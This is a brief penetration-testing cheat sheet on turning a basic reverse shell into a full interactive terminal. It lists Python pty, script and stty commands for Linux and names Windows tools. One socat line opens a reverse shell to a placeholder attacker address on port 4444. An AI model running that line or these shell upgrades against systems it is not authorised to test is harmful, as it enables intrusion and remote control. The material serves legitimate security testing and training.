# Shell Upgrades & TTY

## Linux TTY Upgrade
```bash
# Method 1: Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Method 2: socat
socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:$ATTACK_IP:4444

# Method 3: script
script /dev/null -qc /bin/bash

# After PTY, background (Ctrl+Z), then:
stty raw -echo; fg
reset
export TERM=xterm
```

## Windows Shell Upgrade
```powershell
# Use evil-winrm for interactive PS sessions
# Or use ConPtyShell for proper terminal
```
